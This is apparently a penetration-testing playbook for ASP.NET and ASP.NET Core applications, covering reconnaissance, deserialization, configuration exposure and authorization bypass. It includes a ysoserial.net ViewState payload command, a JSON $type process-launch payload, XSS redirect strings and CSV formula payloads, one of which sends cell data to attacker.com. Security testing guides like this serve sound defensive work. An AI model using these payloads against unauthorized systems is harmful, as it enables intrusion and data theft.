---
name: dotnet
description: Security testing playbook for .NET applications covering ViewState deserialization, machineKey exposure, Swagger, Elmah logs, and Blazor WASM secrets
depends_on: []
---

# .NET

Security testing for ASP.NET / ASP.NET Core applications. Focus on ViewState deserialization, machineKey exposure, Swagger/Swashbuckle endpoint discovery, Elmah error log access, web.config exposure, and Blazor WebAssembly client-side secret leakage.

## Attack Surface

**ASP.NET Framework (Classic)**
- ViewState: serialized page state in hidden form fields, MAC-protected by machineKey
- machineKey: validationKey + decryptionKey in web.config or machine.config
- Session state: in-proc, SQL Server, State Server
- Web Forms: event validation, request validation, control state

**ASP.NET Core**
- Middleware pipeline: ordering, `UseAuthentication`, `UseAuthorization`
- Data Protection API: key ring for cookie encryption, antiforgery tokens
- Kestrel vs IIS: header handling, path normalization, request size limits

**Authentication**
- ASP.NET Identity: cookie auth, token auth, external login providers
- Windows Authentication / Negotiate
- JWT Bearer tokens, OpenID Connect
- Custom `AuthenticationHandler` implementations

**Routing & Controllers**
- MVC: Controllers, Areas, attribute routing `[Route]`, conventional routing
- Razor Pages: `@page` directive, page handlers (OnGet, OnPost)
- Minimal APIs (.NET 6+): `MapGet`, `MapPost` with `RequireAuthorization`
- Web API: `[ApiController]`, model binding, content negotiation

**Data Layer**
- Entity Framework / EF Core: LINQ, raw SQL via `FromSqlRaw`, `ExecuteSqlRaw`
- Dapper: inline SQL, parameterized queries
- ADO.NET: `SqlCommand`, string concatenation in queries

**Frontend**
- Blazor Server: SignalR-based, server-side rendering, circuit state
- Blazor WebAssembly: client-side .NET runtime, static file deployment
- Razor Views: `@Html.Raw()`, `@Html.Partial()`, tag helpers

**Diagnostics**
- Elmah: error logging with web UI
- Swagger/Swashbuckle/NSwag: API documentation
- Application Insights: telemetry and logging
- Developer exception page (`UseDeveloperExceptionPage`)

## High-Value Targets

- `/elmah.axd` - error log viewer (Classic ASP.NET)
- `/swagger`, `/swagger/index.html`, `/swagger/v1/swagger.json`
- `/api-docs`, `/api/swagger.json`
- `web.config` - exposed via file read, backup, or misconfigured static files
- `/trace.axd` - ASP.NET trace viewer
- `/_framework/` - Blazor WASM assemblies
- `/health`, `/healthz`, `/ready` - health check endpoints
- `/.well-known/openid-configuration` - OIDC discovery
- `/identity/account/` - ASP.NET Identity default routes
- `/signalr/negotiate` - SignalR hub negotiation

## Reconnaissance

**Framework Detection**
- Response headers: `X-Powered-By: ASP.NET`, `X-AspNet-Version`, `X-AspNetMvc-Version`
- Cookie names: `.AspNet.Cookies`, `.AspNetCore.Cookies`, `ASP.NET_SessionId`, `__RequestVerificationToken`
- `Server: Microsoft-IIS/X.X` header
- Default error pages with stack traces mentioning `System.Web` or `Microsoft.AspNetCore`

**Swagger Discovery**
```
GET /swagger
GET /swagger/index.html
GET /swagger/v1/swagger.json
GET /api-docs
GET /api/swagger.json
GET /swagger/ui
GET /api/docs
```
Swagger JSON contains: all endpoints, parameter schemas, auth schemes, example values, internal model names.

**Diagnostics Probing**
```
GET /elmah.axd
GET /trace.axd
GET /elmah
GET /errorlog.axd
GET /health
GET /healthz
```

**Configuration Exposure**
```
GET /web.config
GET /web.config.bak
GET /web.config.old
GET /appsettings.json
GET /appsettings.Development.json
GET /appsettings.Production.json
GET /connectionstrings.config
```

## Key Vulnerabilities

### ViewState Deserialization

**Attack Mechanism**
- ViewState is a serialized .NET object stored in a hidden `__VIEWSTATE` form field
- Protected by MAC (Message Authentication Code) using machineKey
- With known machineKey: forge ViewState with malicious serialized object (RCE)
- Without MAC validation (rare misconfiguration): direct deserialization attack

**Exploitation**
```
ysoserial.net -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c calc"
```
- Requires: machineKey (validationKey + decryptionKey + algorithm)
- Gadget chains: `TypeConfuseDelegate`, `TextFormattingRunProperties`, `WindowsIdentity`
- POST the crafted `__VIEWSTATE` to any Web Forms page

**ViewState Detection**
- Hidden field `__VIEWSTATE` in page source
- `__VIEWSTATEGENERATOR` reveals generator type
- `__EVENTVALIDATION` indicates event validation is active

### machineKey Exposure

**Sources**
- `web.config` direct access or backup files
- IIS metabase dump (`/iisstart.htm`, administration endpoints)
- Error pages leaking configuration
- Shared hosting: machine-level key shared across applications
- Git history, deployment artifacts

**Impact**
- Forge ViewState (RCE via deserialization)
- Forge authentication cookies (`FormsAuthentication`)
- Forge antiforgery tokens (CSRF bypass)
- Decrypt encrypted ViewState, session data, and cookies

### Swagger/Swashbuckle Exposure

**Information Disclosure**
- Complete API endpoint mapping with HTTP methods and parameters
- Request/response schemas revealing internal data models
- Authentication scheme definitions
- Server URLs including internal/staging environments
- Deprecated endpoints still documented and accessible

**Exploitation**
- Map all endpoints without fuzzing
- Discover admin/internal endpoints not linked in UI
- Extract expected parameter formats for injection testing
- Identify authentication gaps (endpoints missing auth schemes in Swagger definition)

**Swagger UI Risks**
- "Try it out" functionality may send real requests with credentials
- `persistAuthorization: true` storing tokens in browser localStorage

### Elmah Error Logs

**Access**
```
GET /elmah.axd
GET /elmah.axd/download
GET /elmah.axd/rss
GET /elmah.axd/about
```

**Information Disclosure**
- Full stack traces with source code paths
- Exception messages containing SQL queries, connection strings, internal URLs
- Request data: form values, query strings, headers, cookies
- User identity information, session data
- Server environment variables

### web.config Exposure

**Sensitive Contents**
```xml
<connectionStrings>
  <add name="DefaultConnection" connectionString="Server=...;Password=..." />
</connectionStrings>
<machineKey validationKey="..." decryptionKey="..." />
<appSettings>
  <add key="ApiKey" value="..." />
</appSettings>
```

**Access Vectors**
- Direct request: IIS misconfiguration serving .config files
- Backup files: `.bak`, `.old`, `.save`, editor artifacts
- Short filename (8.3) access: `web~1.con` on older Windows/IIS
- File read vulnerabilities (LFI, XXE) targeting known path

### Blazor WebAssembly Secrets

**Client-Side .NET Assemblies**
```
GET /_framework/blazor.boot.json          # Assembly manifest
GET /_framework/{AssemblyName}.dll        # .NET assemblies
GET /_framework/{AssemblyName}.pdb        # Debug symbols (if deployed)
```

**Decompilation**
- Download all DLLs listed in `blazor.boot.json`
- Decompile with ILSpy, dnSpy, dotPeek
- Extract: API keys, connection strings, internal URLs, business logic, hardcoded credentials
- PDB files reveal: source code paths, local variable names, line numbers

**Secret Exposure Patterns**
- `appsettings.json` bundled into WASM output
- `HttpClient` base addresses pointing to internal APIs
- Auth token handling logic revealing token format and validation
- Feature flags, admin paths, hidden endpoints in routing configuration

### ASP.NET Core Middleware Ordering

**Authorization Bypass**
```csharp
// WRONG: UseAuthorization before UseAuthentication
app.UseAuthorization();     // Runs first, no identity established
app.UseAuthentication();    // Runs second, too late

// WRONG: Static files served before auth
app.UseStaticFiles();       // Serves files without auth
app.UseAuthentication();
app.UseAuthorization();
```

**Endpoint Authorization Gaps**
- Minimal API endpoints without `.RequireAuthorization()`
- Controller actions missing `[Authorize]` when others in the same controller have it
- Fallback policy not configured: unauthenticated access to unlisted endpoints

### Deserialization (Beyond ViewState)

**BinaryFormatter**
- Used in: session state serialization, remoting, custom binary protocols
- Any user-controlled input reaching `BinaryFormatter.Deserialize()` enables RCE
- Deprecated in .NET 5+ but still present in legacy applications

**JSON Deserialization**
- `TypeNameHandling.All` or `TypeNameHandling.Auto` in Newtonsoft.Json
- `$type` field injection: `{"$type":"System.Diagnostics.Process,...","FileName":"cmd","Arguments":"/c calc"}`
- System.Text.Json (default in .NET Core): generally safe but custom converters may introduce issues

**XML Deserialization**
- `XmlSerializer`, `DataContractSerializer` with known type resolution
- `SoapFormatter` in legacy SOAP services

### SignalR Security

**Hub Method Authorization**
- Hub methods without `[Authorize]` attribute callable by any connected client
- Connection-level auth may not apply to individual hub method invocations
- Group management: clients joining groups they should not access

**Circuit State (Blazor Server)**
- Server-side state per circuit: tampering via manipulated SignalR messages
- Circuit reconnection may skip re-authentication

## Bypass Techniques

- IIS short filename enumeration: `GET /ABCDEF~1.ASP` to discover hidden files
- Path normalization: `/api/../admin`, `/admin;.js` treated differently by IIS vs Kestrel
- HTTP.sys vs Kestrel differences in request parsing (request smuggling potential)
- `X-Original-URL` and `X-Rewrite-URL` headers for path override (reverse proxy bypass)
- Parameter binding: query string vs route vs body may hit different validation paths
- Content negotiation: `Accept: application/xml` may trigger XML deserialization path

## Testing Methodology

1. **Framework fingerprint** - Detect ASP.NET version, identify Framework vs Core, check headers
2. **Diagnostics access** - Probe Elmah, Swagger, trace, health endpoints
3. **Config exposure** - Check web.config, appsettings.json, backup files, short filename enumeration
4. **ViewState analysis** - Decode ViewState, check MAC enforcement, test forgery if machineKey known
5. **Blazor WASM** - Download and decompile assemblies, search for secrets and internal URLs
6. **Auth boundaries** - Test middleware ordering, missing [Authorize], Minimal API endpoint gaps
7. **Deserialization** - Test for BinaryFormatter endpoints, JSON $type injection, ViewState attacks
8. **SignalR** - Test hub method authorization, group access control, circuit state manipulation

## Corpus-Derived Attack Patterns

### Debug and Diagnostic Endpoint Enumeration

.NET applications expose framework-specific diagnostic artifacts beyond Elmah and Trace. Systematically probe for all known debug surfaces on every discovered host.
- ASP.NET-specific: `/Trace.axd`, `/Elmah.axd`, `/_layouts/15/start.aspx`, `/Error.aspx`, `/__browserLink/`
- Developer exception page (Core): trigger 500 error -- `UseDeveloperExceptionPage()` in production leaks full stack traces, source code, and environment variables
- Health check endpoints with verbose mode: `/health?include=full`, `/healthz/ready`, `/diagnostics`
- Application Insights profiler: `/profiler`, `/snapshot`, `/_vs/browserLink`

### Backup and Editor Artifact File Exposure

For every `.aspx`, `.asmx`, `.ashx`, `.config` URL, append backup-extension variants. These bypass IIS file extension restrictions that block `.config` but serve `.config.bak`.
- Extensions to test: `.bak`, `.old`, `.orig`, `.save`, `.copy`, `.tmp`, `.swp`, `~`, `.1`, `.2`
- Editor artifacts: `.aspx.cs~`, `.config.bak`, `web.config.old`, `appsettings.json.bak`
- Short filename (8.3) enumeration: `web~1.con`, `appsettings~1.json` on Windows/IIS
- IIS will serve backup files as static content even when the original extension is protected

### CSP Bypass via Whitelisted Script Hosts

When a .NET application deploys Content-Security-Policy, audit every host in `script-src` for known bypass gadgets.
- For each whitelisted host: check if it serves AngularJS, jQuery+templates, JSONP endpoints, or callback-reflecting scripts
- Google domains (`*.googleapis.com`, `*.gstatic.com`): search for AngularJS CDN URLs that enable `ng-app` sandbox escape
- CDN hosts serving outdated library versions with known XSS gadgets
- `unsafe-eval` or `unsafe-inline` alongside seemingly strict CSP renders the entire policy ineffective

### IDOR on File Download Endpoints

Any endpoint serving files via sequential or predictable identifiers (`Download.aspx?id=`, `GetFile?attachmentId=`, `api/documents/{id}`) is an IDOR candidate.
- Enumerate file download URL patterns: `Download.aspx`, `GetFile`, `attachment`, `view-pdf`, `export`, `document`
- Test sequential ID enumeration: increment/decrement the ID parameter
- Test GUID prediction: some implementations use sequential GUIDs (`NEWSEQUENTIALID()`)
- Cross-user test: download files belonging to other users/organizations by substituting IDs

### CSV and Formula Injection in Exports

Any export feature producing CSV, Excel, or PDF from user-controlled data can execute formulas in the recipient's spreadsheet application.
- Inject payloads into any user-editable field: `=CMD|'/C calc'!A0`, `=HYPERLINK("http://attacker.com/steal?d="&A1)`, `@SUM(1+1)*cmd|'/C calc'!A0`
- Fields to target: usernames, descriptions, comments, custom fields, report titles
- Test both direct export and scheduled/emailed reports
- Tab and newline injection (`\t`, `\r\n`) can break out of the current cell into adjacent cells

### Open Redirect to JavaScript XSS Chain

When an open redirect vulnerability exists, immediately test active content schemes. Redirect parameters that accept `javascript:` bypass same-origin restrictions entirely.
- Test redirect parameters (`return_url`, `next`, `redirect`, `continue`, `goto`) with: `javascript:alert(document.domain)`, `data:text/html,<script>alert(1)</script>`, `//attacker.com`
- URL validation that checks for `https://` prefix: bypass with `javascript://https://expected.com/%0aalert(1)`
- OAuth `redirect_uri` parameters: test `javascript:` scheme if URL validation is regex-based
- .NET `Response.Redirect()` and `RedirectToAction()` with user-controlled URLs

### Domain Takeover via Stale DNS Records

Subdomain takeover on .NET applications occurs when CNAME records point to deprovisioned cloud resources (Azure, Fastly, AWS). The takeover inherits the target's domain trust.
- Resolve all CNAMEs for discovered subdomains -- any pointing to `*.azurewebsites.net`, `*.cloudapp.azure.com`, `*.trafficmanager.net`, `*.fastly.net` are candidates
- Check if the CNAME target returns NXDOMAIN or a hosting provider default page
- Impact: full subdomain control enables cookie theft (parent domain cookies), CSP bypass (if subdomain is whitelisted), and OAuth token theft (if redirect_uri matches)
- Check every CSP `script-src`, CORS allowlist, `frame-ancestors`, and OAuth `redirect_uri` whitelist for stale subdomain entries

## Validation Requirements

- ViewState RCE: forged ViewState with machineKey triggering deserialization (command execution or OAST callback)
- machineKey exposure: keys retrieved from web.config or error page enabling cookie/ViewState forgery
- Swagger exposure: complete API documentation accessible in production with internal endpoints visible
- Elmah access: error log entries revealing stack traces, connection strings, or user data
- web.config exposure: configuration file contents including connection strings or keys
- Blazor secrets: decompiled assembly containing hardcoded API keys, connection strings, or credentials
- Auth bypass: request to protected endpoint succeeding without valid authentication
- Deserialization: RCE or object manipulation via crafted serialized payload
- File download IDOR: accessing another user's file by manipulating the download endpoint identifier
- CSV injection: formula execution in exported spreadsheet triggered by injected cell payload
